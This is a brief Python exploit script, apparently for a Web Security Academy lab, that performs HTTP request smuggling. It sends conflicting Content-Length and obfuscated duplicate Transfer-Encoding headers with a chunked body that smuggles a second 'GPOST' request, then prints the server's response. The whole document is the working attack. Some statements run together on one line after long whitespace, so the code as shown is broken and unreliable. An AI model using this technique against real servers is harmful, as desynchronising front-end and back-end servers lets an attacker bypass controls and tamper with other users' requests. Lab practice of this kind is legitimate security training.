#HTTP REQUEST SMUGGLING EXPLOIT BY AFK
#Change connection param and make request twice

import http.client
import pprint
                                                                                        
connection = http.client.HTTPSConnection('0a3000050423e8abc0d36c1a004900bc.web-security-academy.net')
headers = {'Connection': 'keep-alive','Content-type': 'application/x-www-form-urlencoded','Content-Length': '4', 'Transfer-Encoding': 'chunked', 'Transfer-encoding': 'abc'}                                                                                            data = "5d\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 11\r\n\r\nwxyz\r\n0\r\n\r\n"                                               data = data.encode('utf-8')                                                             
connection.request('POST', '/', data, headers)

response = connection.getresponse()

headers = response.getheaders()
pp = pprint.PrettyPrinter(indent=4)
pp.pprint("Headers: {}".format(headers))

print(response.read().decode())
